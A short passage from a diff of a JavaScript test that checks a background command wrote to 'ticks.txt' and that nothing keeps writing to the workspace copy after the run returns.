+  const size = async () => (await readFile(join(workspace, 'ticks.txt'), 'utf8').catch(() => '')).length;
+  const first = await size();
+  assert.ok(first > 0, 'The background command ran');
+  await new Promise(resolve => setTimeout(resolve, 1500));
+  assert.equal(await size(), first, 'Nothing writes to the copy after the run returned');
 });
